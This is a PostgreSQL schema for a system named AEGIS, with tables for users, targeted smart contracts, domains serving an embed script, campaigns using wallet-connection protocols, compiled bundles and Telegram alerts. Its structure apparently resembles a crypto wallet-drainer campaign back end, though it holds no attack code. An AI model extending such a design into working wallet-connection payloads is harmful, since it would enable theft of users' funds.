-- AEGIS relational core (PostgreSQL 15)
CREATE EXTENSION IF NOT EXISTS pgcrypto;

CREATE TABLE IF NOT EXISTS users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  role TEXT NOT NULL DEFAULT 'operator',
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Contracts the operator may target (operator-owned contracts)
CREATE TABLE IF NOT EXISTS contracts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  address TEXT NOT NULL,
  chain_id INTEGER NOT NULL,
  name TEXT,
  abi JSONB,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  UNIQUE (address, chain_id)
);

-- Domains the operator owns. The embed script is only served here.
CREATE TABLE IF NOT EXISTS domains (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  origin TEXT UNIQUE NOT NULL,
  owner TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS campaigns (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  name TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'draft', -- draft | forged | deployed | monitor
  contract_id UUID REFERENCES contracts(id),
  chain_id INTEGER,
  domain_id UUID REFERENCES domains(id),
  protocol TEXT NOT NULL DEFAULT 'reown', -- reown | walletconnect-v2 | rainbowkit
  config JSONB NOT NULL DEFAULT '{}',
  created_by UUID REFERENCES users(id),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS compile_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  campaign_id UUID REFERENCES campaigns(id),
  bundle_url TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS telegram_alerts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  alert_class TEXT NOT NULL,  -- ALPHA BRAVO CHARLIE DELTA ECHO
  content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Encrypted-at-rest operator API keys
CREATE TABLE IF NOT EXISTS api_keys (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  name TEXT NOT NULL,
  key_ciphertext TEXT NOT NULL,
  created_by UUID REFERENCES users(id),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  revoked_at TIMESTAMPTZ
);

-- An operator who will administer the system (password: change-me)
INSERT INTO users (email, password_hash)
VALUES ('operator@example.com', 'CHANGE_ME_PBKDF2_SHA256')
ON CONFLICT (email) DO NOTHING;